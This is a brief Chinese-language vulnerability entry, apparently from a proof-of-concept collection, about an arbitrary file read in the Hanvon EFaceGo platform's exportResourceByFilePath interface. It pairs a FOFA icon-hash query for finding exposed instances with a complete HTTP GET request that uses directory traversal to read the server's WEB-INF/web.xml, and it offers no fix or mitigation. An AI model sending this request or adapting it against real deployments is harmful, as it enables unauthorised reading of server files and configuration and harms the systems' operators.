## 汉王EFaceGo exportResourceByFilePath 任意文件读取漏洞

## 漏洞描述
汉王 EFaceGo 平台 `exportResourceByFilePath` 接口允许未经授权的文件路径传入，可直接读取服务器任意文件。

## 网络空间测绘
```
fofa: icon_hash="1380907357"
```

## POC
```
GET /manage/intercom/../../../../manage/leavelist/exportResourceByFilePath.do?filePath=../WEB-INF/web.xml HTTP/1.1
Host: [请补充实际域名]
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
```

## 参考
- 社区情报

